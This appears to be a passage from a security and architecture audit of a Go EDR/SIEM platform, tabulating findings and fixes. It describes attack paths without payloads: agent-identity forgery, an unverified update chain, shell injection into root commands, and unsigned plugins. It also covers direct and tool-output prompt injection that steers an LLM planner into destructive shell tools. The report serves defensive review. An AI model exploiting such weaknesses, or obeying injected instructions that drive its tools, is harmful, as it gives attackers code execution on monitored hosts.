File: `dev/internal/server/sync.go:376-433,492-560,554-560,649-672`. Observed: `agentProtected` sets `ctxKeyAgentID` but `handleEDRHeartbeat` decodes `hb.AgentID` from body and updates that row; `handleEDREvents` attributes `body.AgentID`; `handleEDRActionsPending` keys off `?agent_id=`; `handleEDRActionResult` updates `WHERE id=?` only. Problem: authenticated identity ignored. Impact: any valid agent key forges events/heartbeats for any agent, steals `run_script` payloads, poisons action state. Recommendation: overwrite body ID with ctx ID; `WHERE id=? AND agent_id=?`; test matrix A-token + B-id = 403/empty.

### SEC-10 detail — update chain
File: `dev/internal/server/sync.go:1163-1275`, `dev/internal/edr_agent/updater/updater.go:82-103`. Observed: version compare is string `>`; hash arrives in the same `update/check` response; `if SHA256 != \"\"` skips verification when empty; download URL built from `r.Host` (host-header poison); `ServeFile` containment is prefix-without-separator. Recommendation: semver compare; signature over (version + sha) with offline pubkey; HTTPS-only base URL from config; `filepath.Rel` containment + `O_NOFOLLOW`; `fsync` before rename; stage + verify + swap + rollback.

# Architecture Findings

| ID | Severity | Component | Problem | Why It Matters | Recommendation |
| -- | -------- | --------- | ------- | -------------- | -------------- |
| A1 | Critical | Tenancy: `dev/internal/server/sync.go:535-536,687-689`, `dev/cmd/trace/serve.go:143-147` | `TenantID` hardcoded `default`; agents list `OR org_id=''`; auto-case per alert | Cross-org reads; unpartitioned events; alert storm creates case explosion | Thread org from auth ctx into tenant; backfill + index; per-tenant tests; rate-limit auto-case |
| A2 | Critical | Injection: `dev/internal/response/response.go:98-110,287-290`, `dev/internal/edr_agent/response/executor.go:267,400` | `Sprintf(ip/path)` into `sh -c`/`powershell` in both stacks | Attacker params reach root shell; fleet-wide (see SEC-11 detail) | `exec.Command(argv)` + validators; drop `sh -c`; default approvals; unify stacks behind one argv contract |
| A3 | High | TSE router `dev/internal/storage/router/router.go:52` | `hadError` bool written by both hot/cold goroutines, read after `Wait`, no guard | Data race; flaky metrics; `-race` failure | `atomic.Bool` or errors-channel-only + race test |
| A4 | High | Durability `dev/internal/storage/sqlite/hot_store.go:49-55` | `synchronous=OFF` contradicts documented WAL+NORMAL | Acked batches can vanish on crash; exactly-once claim false | `WAL+NORMAL` + dedicated writer; kill-9 suite; document checkpoint policy |
| A5 | High | Partition `dev/internal/storage/sqlite/hot_store.go:114-115` | Table chosen from `events[0].Timestamp` only | Cross-hour batches mis-partitioned; wrong table DROPped | Split batch by hour; straddle test; assert table bounds |
| A6 | High | Throughput `dev/internal/storage/sqlite/hot_store.go:86-103`, `dev/internal/siem/siem.go:178` | 62-row recursive chunks (16 vars x 62 = 992) + serial decoders + single-goroutine RuleEngine | ~16x fsync amplification; burst loss via drop+log | Single-txn prepared chunks; JSON fast-path; precompiled regex; worker pool; reuse TSE queue |
| A7 | High | Query `dev/internal/storage/sqlite/hot_store.go:348-395`, `dev/internal/storage/router/router.go:40-132` | Hot `UNION ALL` over all live tables (no hour prune); open queries fan both tiers; limit-after-materialize | Full scans + in-memory sort; p99 collapse; OOM (see P2) | Prune tables by hour suffix; push LIMIT per tier; heap k-way merge; tenant predicate |
| A8 | High | Scheduler `dev/internal/hunt/scheduler.go:52-86`, `dev/internal/hunt/manager.go:158` | 60s tick sequential, `runHunt` 10m ctx blocks others; `DueHunts` List then per-hunt Get (N+1) | Head-of-line blocking; missed hunts; DB churn; duplicate runs multi-node | Worker pool; single `SELECT *`; cron lib; `next_run` CAS claim |
| A9 | High | Queue `dev/internal/taskqueue/taskqueue.go:55-70` | `Claim` read-then-write DEFERRED tx, unconditional `UPDATE`, no `SKIP LOCKED`/lease; 2s poll floor | Double-execution of destructive response work | `UPDATE ... WHERE status='pending' ... RETURNING` + lease + idempotency keys |
| A10 | High | Globals `dev/cmd/trace/root.go:497`, `dev/internal/storage/storage.go:disk.go:10`, `dev/internal/storage/metrics/metrics.go:60`, `dev/internal/archive/intel.go:63` | `var app` singleton; `StoragePathFunc`; `metrics.Global`; `knownIOCs` mutable; ephemeral audit key | No parallel/test isolation; tenant bleed; unverifiable audit | Inject deps; per-instance metrics; persist audit key 0600; freeze intel map |
| A11 | High | God files `dev/internal/edr_agent/agent.go:36` (~1020L), `dev/internal/dispatch/host.go` (~1072L), `dev/internal/server/sync.go` (~1305L), `dashboard.go` (~859L), `siem/rules.go` (~941L) | 5+ concerns per file (route+handler+SQL+HTML; planner+LLM+synthesis) | Unreviewable; defect density; style drift; CDN dependency | Split by boundary (routes/handlers/store/render); file-size lint; extract dashboard templates |
| A12 | High | Mixed concerns `dashboard.go:pageStyle`, `config.go` 0644 + exe-sniff `repoDir`, App TUI DTO adapters | Secrets leak; redeploy for CSS; DTO drift; style in Go | Templates + vendored assets; 0600; mapping inside `tui` pkg |
| A13 | High | Authz/enroll `dev/internal/server/sync.go:RegisterRoutes`, `handleEDRRegister`, `edr_agent/agent.go:New` | Open enroll; client `org_id`; auto-minted APIKey | Spoofing (see SEC-02/08) | Provision token; server-assigned org; scope checks |
| A14 | High | Silent loss `dev/internal/edr_agent/queue/queue.go:Push` evict-100, `siem.go` drop+log, TSE `OnDrop` unwired | Evidence gaps exactly when overloaded | Wire metrics + notifier; NACK/429; zero-drop soak test |
| A15 | Medium | PG shim `dev/internal/db/db.go:56-110` `translate()` | String-replace `?` to `$N`, `datetime`/`strftime`, `INSERT OR` — corrupts literals; `BeginTx` raw; `AUTOINCREMENT` DDL | Postgres backend unusable; stateless-server plan blocked | Quote-aware lexer; per-driver migrations; integration test on PG |
| A16 | Medium | Playbook `dev/internal/playbook/interpolate.go`, `executor.go:220-221` | Missing var to `""`; `if` only `==/!=`; `PendingApprovals` stub error | Wrong-target enrichment; advertised approval API permanently broken | Fail-closed interpolation; `>=/contains`; implement or delete stub + CLI |
| A17 | Medium | Audit `dev/internal/audit/logger.go:Write` | `Details` excluded from HMAC; full-scan `Verify` | Weak attestation (see SEC-17) | Include details; persist key; paged Verify |
| A18 | Medium | Duplicate stacks `dev/internal/response` vs `dev/internal/edr_agent/response` | Divergent snapshot/rollback semantics | Inconsistent fix; double audit | Shared action contract + argv helpers |
| A19 | Medium | Shard truth `dev/internal/storage/shard/router.go`, `dev/cmd/trace/tse_init.go` | Per-shard watermark; parent + shard double alloc when `ShardCount>1` | Missed/dup events; 2x cost | Global vector watermark or defer shards; lazy init; document hash key |
| A20 | Medium | Leader `dev/internal/storage/leader.go:41-150`, `tse_init.go` start-once | S3 heartbeat 5s/timeout 15s; `Download` err triggers `promote()`; never written back; follower never promotes | Split-brain dual flushers | Fencing epoch/term; lease CAS; watch loop; single writer |
| A21 | Medium | S3 `dev/internal/storage/s3.go:32-60` | BasicAuth over HTTP unless `UseSSL`; naive `List <Key>` split; no SigV4/multipart | MinIO-only; plaintext default | SDK v2; `UseSSL=true` default; warn on plaintext + keys |
| A22 | Medium | Overlap `dev/internal/storage/router/router.go` boundary +-10m | Double recent I/O on every boundary query | p99 penalty | Configurable overlap + duplicate metric |
| A23 | Medium | Fleet poll `dev/internal/edge/client.go:30-55` push-50 | No delta cursor; hand-split IOC parse; `Close` no-op | Server overload; duplicates | Delta cursor + `UNIQUE(node,id)` dedup |
| A24 | Medium | Deploy `dev/deploy/daemonset.yaml` | `privileged` + `hostPID`/`hostNetwork` + `SYS_ADMIN/PTRACE/NET_ADMIN` + 512Mi + `latest` + `CHANGE_ME` | Blast radius; OOM; image drift; committed secret | Least-priv + seccomp/AppArmor; pin SHA; external Secret; SLOs + resources |
| A25 | Low | Dead code `executor.go:PendingApprovals/formatOutput`, `tools/wazuh-converter` absolute paths, dual playbooks | Stubs; `C:/Users/YMA` + `D:/` paths; two sources of truth | Bit-rot; unreproducible gen | Delete or implement; `-in/-out` flags + `ruleset.lock`; single playbook source |

Fitness judgment: multi-org UNFIT (A1/A10/A13/SEC-08); high-volume MARGINAL (A4-A7/A14 + P/R findings); long-running GOOD BONES with gaps (fix A4/A20/A23 + kill-9/soak). Keep modular monolith — microservices would multiply the trust, lifecycle, and exactly-once problems.
# Hardcoding Findings

## A. Correct hardcoding — KEEP (intentionally static, safe to remain)

| Location | Observed | Why acceptable |
| -------- | -------- | -------------- |
| `dev/internal/edr_agent/monitor/event.go:24-27` | Severity enum 1/3/5/7 | Wire enum; changing breaks storage sort, thresholds, dashboard scales — must be versioned, not configured |
| `dev/internal/edr_agent/monitor/etw_windows.go:36-40`, `process_hollowing_windows.go:35-36` | ETW flags `0x01000000`, EIDs 1/2, masks `0x0010/0x1000` | Windows SDK ABI; changing breaks OS contract |
| `dev/internal/edr_agent/monitor/pe.go:276,279` | MZ / XML magic bytes | File-format constants |
| `dev/internal/crypto/gencert.go:19,37-38` | P-256, KeyUsage, ServerAuth, -1h skew | Algorithm + safety invariant (365d lifetime itself is B — should be config) |
| `dev/internal/edr_agent/transport/client.go:~100` | TLS 1.2 floor | Security floor; raising is fine, lowering must never be configurable |
| `dev/internal/integration/notifier/notifier.go:414-415,~300` | `http` prefix check; `465`=SMTPS | Protocol/RFC semantics |
| `dev/internal/dispatch/host.go:315-316` | `sha256[:16]` cache-key width | Internal width; no operator meaning |
| `dev/internal/siem/decoder.go:20-24` | Apache/syslog regex grammars | Log grammars (the *severities derived from them* are C — must be data) |
| `dev/internal/compliance/frameworks.go` control IDs | `1.1.6`, `Art.33`, `A.13.1.1` | Published standard IDs; text around them is data |
| `dev/internal/siem/wazuh_*_gen.go`, `dev/internal/archive/mitre_seed_gen.go:3-4` | Vendored generated snapshots | Keep vendoring pattern, but add version pin + `ruleset.lock` + CI verify |
| `dev/internal/db/db.go:181-314` schema defaults, 0600, point-query `LIMIT 1` | Schema safety invariants | Correct as code |

## B. Configuration that must be externalized (env + flag + file, with Validate)

| Location | Observed | Recommendation |
| -------- | -------- | -------------- |
| `dev/internal/config/config.go:134,138-140,143` | Defaults (openai, zstd/2h/30s, `:514`) with only 7 `TRACE_*` keys | Bind every field to `TRACE_*` + flag; document precedence `TRACE_* > flag > file > DB(remote) > default`; add `Validate()` ranges; `config check` + `config dump --effective` |
| `dev/internal/edr_agent/config.go:62` + sprawl (`admin.go:234`, `agent.go:25`, `edr_cmd.go:56`, `server.go:35`, `server_cmd.go:61`, `demo.go:43`) | `https://127.0.0.1:8080` vs `localhost:8080` vs `:8080/:8443` literals in 6+ files | Single `ServerAddr` const in central config; fail-closed production default |
| `dev/internal/edr_agent/config.go:64-68,81-88` | Poll 5s / heartbeat 30s / batch 2s/100/10000 / FIM 50MB-60s / CVSS 4.0-6h / CPU 0.5-256 / EPS 500-5000 | All tunable + extend `MergeRemote` to full schema + JSON schema |
| `dev/cmd/trace/update.go:17,215,240,260,248` | GitHub releases URL, 30s timeouts x3, 17 playbook names | `update_base_url`/`timeout` + playbook manifest file (air-gap support) |
| `dev/internal/archive/cve.go:31,76`, `intel.go:194,208` | NVD 10s + URL; Firecrawl 30s + URL | `intel.{nvd_url,web_search_base_url,timeout}` |
| `dev/internal/integration/{abuseipdb,otx,notifier}/`, `dev/internal/integration/edr/edr.go:60-92`, `transport/client.go` | Base-URL fallbacks, maxAge 90, timeouts 15s/30s, backoff cap 30s, idle 10/90s, UA `trace-agent/0.1.1` | Per-connector `base_url/timeout/circuit`; build-stamped UA; single `Version` ldflags |
| `dev/internal/dispatch/host.go:34,267-280,422-443,550-551` | 30s x2, 10s LLM ctx, 500ms, cache 100/10m, temp 0.1/tokens 300 | `llm.{timeouts,cache,temperature,tokens,budget}` |
| `dev/internal/edr_agent/agent.go:118-120,225,557,613,699,794` | Retry 30s/5/1s, netmon 30s, update 6h, cfg-poll 30m, ticks 60s/5m/10m, scan 30s | Agent cadence config section |
| `dev/internal/edr_agent/monitor/{correlator,dedup,scancache,tree,fim,etw_channels,filesystem}.go` | 5s/60s/5m/10s, 30s/10000, 1h/10000, 100000/10000/5MB, 60s clamp, 10s/30s/50k | Per-subsystem defaults section; single `pe.entropy_threshold` (today `7.0` in 3 files) |
| `dev/internal/edr_agent/response/executor.go:24,32` | `TempDir` quarantine, 30s timeout | `response.{quarantine_dir,timeout}` — HIGH (quarantine path is a trust boundary) |
| `dev/internal/storage/hashshare.go:15-17` | `239.0.0.88:1980`, `:1981`, 5m | `hashshare.{addrs,ttl}` |
| `dev/internal/siem/siem.go:73,90-91,219,309` | Chans 10000/1000, dedup 5m, udp 65535, retry 10s | `siem.{chan,dedup,buf}` config |
| `dev/internal/storage/{batch/writer.go:28,flusher.go:63-69,groups.go:33}` | 1000/250ms, 30s/256MB/100k, 5m | TSE batch/flush config; bind `FlushInterval` flag to struct |
| `dev/internal/edge/client.go:30-55`, `telemetry.go:36`, `gencert.go:36`, `genkey.go:55,110`, `cases/manager.go:147`, `exporter.go:78`, `queue.go:76` | 15s/30s, version skew `0.1.0-dev` vs `0.1.1`, 10s, 365d/2048-bit, LIMIT 100/50, evict 100 | Edge/telemetry/TLS/page/evict config; single version source |

## C. Rules that must become data-driven (versioned files, hot-reload)

| Location | Observed | Recommendation |
| -------- | -------- | -------------- |
| `dev/internal/archive/intel.go:63-139,147` | ~25 builtin IOCs + confidences + substring fallback; warm TTL `86400*30` | `seed-iocs.json`; exact + CIDR match (kill substring FP); single store |
| `dev/internal/sift/hash.go:65-75` | 9 hashes duplicating `intel.go` with different confidences | Delete; single intel store (source of conflicting verdicts today) |
| `dev/internal/edr_agent/monitor/yara.go:332-405` | 15 rules + severities + regexes, entropy `7.0` | `yara/*.yar` hot-reload via `update` + SIGHUP |
| `dev/internal/edr_agent/monitor/{process.go:296-310,filesystem.go:185-196,tree.go:143-166}` | powershell/cmd substring list; temp/downloads/startup list; office->script matrix | Allowlist-aware rule packs + path rules + ancestry policy table |
| `dev/internal/edr_agent/monitor/correlator.go:240-244` + `flood.go`/`fplearn.go`/`killchain.go` | 4 rules windows/thresholds/sevs; 1s/60s/3x, 10/300s, 5m/3steps | `correlator.rules.yaml` + flood/killchain config |
| `dev/internal/edr_agent/monitor/{entropy.go,pe.go}` + `vuln.go:568-587` | z 3.0/decay 0.01/100; `7.0` x3; builtin CVE rows | Single entropy config + feed URL with snapshot expiry |
| `dev/internal/dispatch/host.go:640-700` | Score ladder 0.95/0.7/0.3/0.85/0.75/0.8/0.1/0.5 + labels | `scoring.weights.yaml` with calibration tests |
| `dev/internal/siem/{decoder.go:96-243,rules.go:709-750}` | Decoder severities (`500->3`, `1116->5`) scattered x4; 17 builtin rules + playbook links | Per-decoder severity maps + cross-scale table; ship builtins as `siem/rules/*.yaml` (`k8s.yaml` is the template) |
| `dev/internal/siem/rules.go:228 mapCompliance`, `compliance/frameworks.go:50-264` | MITRE->compliance switch (~30 IDs) + control text + score formula in code | `compliance.map.yaml` + framework packs (static labels today = false assurance) |
| `dev/internal/edr_agent/response/executor.go:91-113` | 8-action allowlist, no policy dimension | `response-policy.yaml` (role x action x approval-required) |

## D. Provider logic incorrectly encoded as conditionals (registry / strategy / adapter)

| Location | Observed | Recommendation |
| -------- | -------- | -------------- |
| `dev/internal/dispatch/host.go:460-588` | `switch anthropic/ollama/openai` x3 + model literals + `2023-06-01` header | `LLMProvider` interface + self-registering map; default schema per provider; budget caps |
| `dev/internal/integration/edr/edr.go:125-383+` | `switch crowdstrike/s1/mde` in ~7 methods + vendor paths + `login.microsoftonline` | Per-vendor strategy + factory; shared rate/circuit; config carries cert/OAuth |
| `dev/cmd/trace/root.go:389-404` | Provider `crowdstrike` literal; `splunk`/`elastic` `New()` with no config | Connections in central config; construct from config, not literals |
| `dev/internal/integration/{splunk,elastic,otx,abuseipdb,notifier}/` | Per-agent URL parsing + base fallbacks; notifier channel switch per payload | Shared `Connector` adapter (base/timeout/auth/verify); `Notifier` interface registry |
| `dev/internal/siem/siem.go:88,97-98,108` | 8 fixed decoders + double `LoadDefault` | Single `RegisterDecoder(name, priority, fn)` + load-once; order-tested |
| `dev/internal/archive/{cve.go:75,intel.go:208}` | Bespoke NVD/Firecrawl clients | `IntelSource` interface (`Fetch/Normalize/Cache`) |

## Configuration strategy (coherent, recommended)

1. One loader, one precedence: `TRACE_*` > flag > file > DB(remote) > default. Struct-tag env binding + `Validate()` ranges. Delete ad-hoc `os.Getenv` (`TRACE_SERVER_URL/API_KEY`, `ENTROPY_ZSCORE`, `KILLCHAIN_WINDOW`). Document in `config check` output.
2. Unify `SIEMConfig`: merge `config` + `siem` types; wire telemetry; flags become overrides of the single struct.
3. Secrets: `TRACE_*` + `*_FILE` for every key/token/webhook; 0600/0700; never log; `DisallowUnknownFields` to warn + `config migrate`.
4. Agent parity: every B-literal tunable; full `MergeRemote` schema + JSON schema; single `ServerAddr`; single ldflags `Version`.
5. Rules as data with hot-reload via `update` + SIGHUP: `siem/rules/*.yaml`, `correlator.rules.yaml`, `seed-iocs.json` (dedupe `hash.go`), `yara/*.yar`, `scoring.weights.yaml`, `response/policy.yaml`, compliance packs.
6. Registries over switches: `LLMProvider` / `EDRProvider` / `IntelSource` / `Notifier` / `Decoder` / `Connector` factories; remove the 7 switch clusters.
7. Guardrails: `Validate()` ranges, severity cross-map test, update/intel URLs in config for air-gap.
# Performance Findings

Qualitative impact only. No benchmark numbers asserted (per audit rules).

| Component | Bottleneck | Evidence | Impact | Recommendation |
| --------- | ---------- | -------- | ------ | -------------- |
| P-R1 TSE Router + shard query | Limit applied after materializing 100k (hot) + 100k (cold) rows, sort/dedup x2-3; N-shard fan-out holds Nx100k rows in RAM | `dev/internal/storage/router/router.go:132 Query`; `dev/internal/storage/shard/router.go:195 Query` | Critical (OOM on wide queries) | Push limits per tier; single k-way merge over cursors; stream, don't materialize; cap per-shard rows |
| P-H1 Hot query sort | Cross-table `ORDER BY id LIMIT` sorts the whole `UNION ALL` temp B-tree | `dev/internal/storage/sqlite/hot_store.go:395` buildHotQuery tail | High (latency collapse as tables grow) | Time-prune tables by hour suffix; per-table LIMIT; heap merge |
| P-H2 Cold reader materialization | `make(rg.NumRows())` materializes entire row groups, no streaming/pagination | `dev/internal/storage/cold/parquet_reader.go:168 QueryFiles` | High (mem/CPU) | Stream row-group batches; early-terminate at limit; reuse buffers |
| P-H3 SIEM evaluation | `regexp.Compile` per event + rule-slice copy per event + single-goroutine pipeline | `dev/internal/siem/rules.go:752 Evaluate`, `:862 evaluateFieldExpr`; `dev/internal/siem/siem.go:178` | High (CPU/lag, burst drops) | Precompile all regex at load; shared immutable rule snapshot; worker pool; JSON fast-path |
| P-H4 Agent queue accounting | `COUNT(*)+SUM(LENGTH)` per Push under mutex; per-event push on failure path | `dev/internal/edr_agent/queue/queue.go:58 Push`; `dev/internal/edr_agent/agent.go:678 flushBatch` | High (death spiral under backpressure) | Batched inserts; cached byte/event counters; drain loop with backoff |
| P-H5 TSE spill path | One file per event storing only ID; `Replay` test-only so spill is lossy + IOPS-heavy | `dev/internal/storage/queue/queue.go:168 Write`, `:192 Replay` | High (loss + IOPS storm) | Append-only segment files storing full events; background drain loop; fsync policy |
| P-H6 S3/backup buffering | `string(data)` doubles RAM; whole-object buffer + temp file; backup reads whole tar into RAM | `dev/internal/storage/s3.go:52 Upload`; `cold/parquet_reader.go:118`; `backup/scheduler.go:112` | High (OOM on large files) | Stream `io.Reader` end-to-end; ranged GET; chunked PUT; temp 0600 `O_EXCL` |
| P-H7 Flusher readiness + lock | Ready = 256MB-or-hour-boundary + 5min vs 100k-row reads so groups rarely ready; `f.mu` serializes all flush work | `dev/internal/storage/flusher/groups.go:28 readyGroups`; `flusher.go:96 flush` | High (hot growth / flush stall) | Row/byte + max-age trigger; narrow lock scope; per-group workers with single committer |
| P-M1 Hot write chunking | 62-row recursive chunks (16 vars x 62 = 992 < 999): 100k batch becomes ~1.6k transactions, partial commit | `dev/internal/storage/sqlite/hot_store.go:86-103` | Medium (throughput + atomicity) | Single transaction with prepared statement; chunk only on driver limit; rollback on error |
| P-M2 SIEM I/O | `ReadDir+Stat` poll every 5s per dir; 64KB line cap silently drops; unbounded TCP goroutines per connection | `dev/internal/siem/siem.go:246 watchDirectory`, `:300/:340 syslog` | Medium (loss + FD exhaustion) | fsnotify/inotify; larger line cap with truncation counter; connection limiter + read deadlines |
| P-M3 YARA scan path | Whole-file read + double SHA-256, 8 scanners on 30s cadence | `dev/internal/edr_agent/agent.go:800 scanFileYARA`; `scancache.go:35 Get` | Medium (host load) | Cache-first single hash; scan on create-only; size cap + streaming scan |
| P-M4 Parquet write I/O | Single-row writes + in-memory re-sort + 2 full re-reads (SHA, S3) = ~3x I/O per byte | `dev/internal/storage/parquet/writer.go:82 WriteBatch`, `:122 S3`, `:150 fileSHA256` | Medium | Batch column writes; hash-during-write; stream PUT from temp |
| P-M4b Transport loop | `time.Sleep` ignores ctx; double sleep on 429; `defer Close` inside retry loop | `dev/internal/edr_agent/transport/client.go:180 do` | Medium (FD/goroutine leak, slow cancel) | Context sleep; single backoff path; close per attempt |
| P-M5 Correlator scan | O(buffer x rules) window scans under one mutex per event | `dev/internal/edr_agent/monitor/correlator.go:118 Ingestion` | Medium | Per-rule ring buffers; evaluate off-lock; index by type |

Missing performance instrumentation: no query/watermark cache (`router.go:40` re-reads every query); `ReaderPool` (`cold/pool.go:20`) bypassed by shard `NewDefaultReader` (`shard/router.go:88`); hunt report synthesis unconditional (`hunt/scheduler.go:105`).
# Reliability Findings

Design for at-least-once + idempotent sinks + gap detection. Claimed exactly-once does not hold; `ON CONFLICT DO NOTHING` + `MergeSortDedupByID` look idempotent, but R3/R4/D6 break the invariant chain.

| # | Failure scenario | Evidence | Missing mechanism | Impact | Fix |
| - | ---------------- | -------- | ----------------- | ------ | --- |
| R1 | Crash after ack | `dev/internal/storage/sqlite/hot_store.go:66` `synchronous=OFF` | No durable-ack guarantee; contradicts exactly-once claim | Critical (durability) | `synchronous=NORMAL` minimum + kill-9 suite + checkpoint policy |
| R2 | WAL unbounded growth | `dev/internal/storage/sqlite/checkpoint.go:17 NewCheckpointer` only instantiated in tests (`hot_store_test.go:307`) | Passive loop never wired in production | Medium (disk/restart) | Wire passive loop + idle TRUNCATE; WAL-size metric + alert |
| R3 | Flusher retry duplicates/gaps | `dev/internal/storage/flusher/flusher.go:182 flush` random FileID per retry + per-ready-group watermark advance | No deterministic identity; unready IDs skipped | Critical (loss + dup) | Deterministic FileID (tenant/hour/min-max); advance watermark only past contiguously flushed ranges |
| R4 | Agent retry silent loss | `dev/internal/edr_agent/agent.go:678 flushBatch` push-on-fail but `queue.go:89 PopBatch` never consumed; `PopBatch` deletes malformed rows and mints IDs | No drain loop; byte/ID mutation | High | Drain loop with backoff; preserve original bytes + IDs; quarantine poison rows to DLQ |
| R5 | Task queue stuck work | `dev/internal/taskqueue/taskqueue.go:55 Claim` pending to running, no lease/retry/DLQ; unmarshal errors ignored | Poison task wedges queue; crash orphans running | High | Lease + attempts + DLQ table; `Claim` returns typed errors |
| R6 | Hunt silently missed | `dev/internal/hunt/scheduler.go:86 runHunt` Log + MarkRun on all failures; retry only for unknown playbook | No retry/backoff/alert | Medium | Failure counters + backoff + operator alert; distinguish infra vs no-match |
| R7 | Batch poison head-of-line | `dev/internal/storage/batch/writer.go:88 flush` failure re-prepends whole batch | One poison event starves the stream; unbounded growth | High | Bounded attempts then DLQ; per-event quarantine |
| R8 | Ingest blind loss | `dev/internal/server/sync.go:492,560` malformed `continue` without detail; `go context.Background()` fan-out unbounded | No reject counters; no deadline; stored-vs-received divergence | Medium | Reject counters by reason; bounded worker pool; ctx with trace fields; reconcile metric |
| R9 | External cascade | Only EDR integration has breaker (`edr.go:87`); TSE/SIEM/agent/S3/LLM paths none; no DLQ anywhere | One slow dependency stalls everything | Medium | Breaker + bulkhead + timeout per external call; DLQ for async paths |
| R10 | Blind operations | `dev/internal/storage/metrics/metrics.go:60 Global` most counters never incremented; only EventsRead/Flush/Query wired; `/readyz` never checks DB/TSE | Enqueue/write/watermark invisible; false-green ready | Medium | Wire enqueue/write/flush/watermark/drop; readiness probes DB + TSE + disk |
| R11 | HA split-brain | `dev/internal/storage/leader.go:150 checkLeader/promote` unconditional local promote, never written back | No lease/CAS/fencing; dual flushers both commit | Critical | Lease with fencing token/epoch; single writer; watch loop with demotion |
| R12 | Torn backups | `dev/internal/storage/snapshot/create.go:22 Create` copies live DBs without checkpoint/lock/WAL inclusion | Restore may be unrecoverable | High | Checkpoint + atomic copy of db+wal+shm + manifest verify; restore dry-run test |
| R13 | Dedup persist storm | `dev/internal/edr_agent/monitor/dedup.go:128 loadMem` queries `dedup_key` but table is `dedup_keys` (error swallowed) + 50-row persist cap | Persist always fails; restart re-floods | Medium | Fix column/table name; persist full batch in one txn |
| R14 | Detection blind spot | `dev/internal/edr_agent/monitor/dedup.go:158 eventKey` pid+type / path+type keys; dedup runs before correlator (`agent.go:742`) | Recycled-PID collisions; repeat-modify suppressed; bursts eaten before correlation | High | Richer keys (start-time/cookie/inode/mtime); correlate pre-dedup or on sampled duplicates |
| R15 | Rules never fire | `dev/internal/edr_agent/monitor/correlator.go:205 defaultCorrRules` empty `EventTypes` + `:170 matchesType` returns false on empty | All 4 shipped correlator rules dead on arrival | High (non-detection) | Populate types or match-all semantics + self-test that each rule can fire |

## Concurrency and horizontal-scale analysis

Single-node discipline is mostly coherent (per-shard `writeMu`, channel/mutex hygiene), but horizontal scale breaks at: router `hadError` race (`router.go:52`, fix `atomic.Bool`); batch `Close` vs `Submit` close-channel panic (`writer_goroutine.go:88`, fix closed-flag + drain); task double-claim (`taskqueue.go:60`, fix `WHERE status='pending'` / `SKIP LOCKED`); hunt duplicate runs (fix `next_run` CAS); shard `fnv mod N` remap on N change (fix consistent hash + backfill); multi-writer SQLite with only `busy_timeout` (fix single-writer + busy retry jitter); agent stats counters unsynchronized (`agent.go:650`, fix `atomic.Int64`); priorityq 3:1 not realized + silent drop on full `out` (`priorityq.go:62,82`); queue `Replay` holds `mu` during inject (re-entrant stall; snapshot list, unlock during inject); cold temp `hex(len)` collides + opens `s3://` path not temp + 0644 (`parquet_reader.go:118,140`); flusher/compactor/GC/TTL/scrub mutate the same file set uncoordinated (`compactor.go:62`, `gc.go:60`, `scrub.go:60`; fix single lifecycle state machine); hot `ensureTable` check-under-lock/DDL-outside/append-under-lock race (`hot_store.go:225`, saved by `IF NOT EXISTS`; fix singleflight).

Scale rule until fixed: assume at-least-once delivery, single-writer-per-SQLite-DB, single-scheduler. Do not run two flushers, two schedulers, or N-changing shards against one dataset.
# AI / Agent Security Findings

Reference chain: `Identity -> Authentication -> Authorization -> Policy -> ToolAccess -> Execution -> Verification -> Audit`. No agent in the tree has identity; no per-agent AuthN/AuthZ; no policy layer; no tool-output sanitization. Verdict: the agent system is a confused-deputy fleet with prompt-controlled tool selection and shell-terminated tools.

| # | Severity | Location | Observed | Impact | Missing link |
| - | -------- | -------- | -------- | ------ | ------------ |
| AI-01 | High | `dev/internal/dispatch/host.go:405-409 Plan()` | Raw intent `Sprintf(\"... Intent: %s\", intent)` into LLM prompt; only `Return ONLY JSON` guard | Direct prompt injection forces destructive playbook + params | Policy, Verification |
| AI-02 | High | `dev/internal/dispatch/host.go:114-124 planInvestigation()` | `Get(llmName)` existence-only; `llmParams` verbatim into tool params; regex fallback | LLM output equals tool input — prompt-to-RCE primitive with AI-10/14/25 | Policy, ToolAccess, Verification |
| AI-03 | Medium | `dev/internal/dispatch/host.go:312-316,397-402,427` cache | Unverified LLM JSON cached mem + SQLite 24h keyed `sha256(v+intent+playbooks)` | Poisoned intent persists as backdoor for all later callers | Verification, Audit |
| AI-04 | Medium | `dev/internal/playbook/interpolate.go:51-55` | Missing variable returns `\"\"` inside `ReplaceAllStringFunc` | `iptables -s  -j DROP`, `mv \"\"`, `kill -9 ` — fail-open / wrong-target destruction | Verification, Audit |
| AI-05 | High | `dev/internal/playbook/interpolate.go:63-109` + `executor.go:97-106` | `input/result/outputs.*` with no taint; prior outputs (VT vendors, OTX pulses, web-search markdown, Splunk `_raw`, Elastic hits, log lines, file bytes) interpolatable into next `ip/path/hostname/script/query/webhook`, and into `formatMarkdownReport` | Indirect (tool-output) injection: tool-to-tool and tool-to-LLM chains | Policy, Verification |
| AI-06 | High | `dev/internal/playbook/executor.go:173-182 executeStep` | `registry.Get(step.Agent)` then `Execute(params)` with no caller identity/permission/policy | Any playbook/agent/plugin invokes any capability; LLM planner holds the full toolset | AuthZ, Policy, ToolAccess |
| AI-07 | Critical | `dev/internal/plugin/plugin.go:24-70` | `agents[Name()]=a` last-wins; `plugin.Open(*.so)` + `Lookup(Plugin)` with no hash/signature/allowlist | Malicious `.so` squats `response`/`dispatch`/`sift`; persistence across restarts | Identity, AuthN, Verification |
| AI-08 | Critical | `dev/internal/plugin/sidecar.go:30-150` | `exec.Command(path)` + self-declared `info[name/capabilities]`; arbitrary params forwarded; stderr to Discard; no sandbox | Arbitrary binary + self-granted capabilities + blind result trust + log evasion | Identity, Policy, ToolAccess, Audit |
| AI-09 | High | `dev/internal/agent/agent.go:15-19` | `Name/Capabilities/Execute` only — no principal, scopes, or attestation | Authorization unenforceable by design; systemic | Identity, AuthN, AuthZ, Policy |
| AI-10 | Critical | `dev/internal/response/response.go:82-230` | `blockIP`/`quarantineFile`/`killProcess`/`restartService` build shell via `Sprintf` (see SEC-11 detail) | Host RCE as daemon user, often root | ToolAccess, Execution |
| AI-11 | High | `dev/internal/response/response.go:259-271 rollbackAction` | `SELECT rollback_command ...` then `runCommand()`; guard only `\"\"`/`N/A`; `recordAction` stores `investigation_id=\"\"` | Stored-command injection; cross-investigation RCE on rollback | AuthZ, Verification |
| AI-12 | Critical | `dev/internal/edr_agent/response/executor.go:259-273,400-407 runScript` | `Params[\"script\"]` verbatim to `powershell -Command` / `sh -c` | Any `PermAgentWrite` holder, DB writer, or MITM gets fleet RCE | Policy, ToolAccess, Execution |
